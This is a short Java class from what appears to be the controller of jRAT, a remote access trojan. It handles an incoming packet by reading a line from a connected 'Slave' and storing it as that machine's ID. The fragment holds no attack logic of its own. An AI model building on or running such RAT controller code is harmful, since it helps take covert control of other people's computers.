package jrat.controller.packets.incoming;

import jrat.controller.Slave;

import java.io.DataInputStream;


public class Packet7InitServerID extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		slave.setID(slave.readLine());
	}
}
